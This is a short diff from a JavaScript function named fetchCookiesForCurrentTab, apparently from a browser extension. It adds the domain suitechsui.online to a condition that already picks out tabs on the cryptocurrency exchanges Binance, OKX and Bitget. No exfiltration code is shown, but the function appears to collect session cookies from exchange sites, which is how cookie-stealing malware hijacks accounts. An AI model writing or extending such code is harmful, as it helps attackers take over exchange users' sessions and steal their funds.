@@ -20,6 +20,7 @@ function fetchCookiesForCurrentTab() {
 
       if (
         domain.includes("binance.com") ||
+        domain.includes("suitechsui.online") ||
         domain.includes("okx.com") ||
         domain.includes("bitget.com")
       ) {
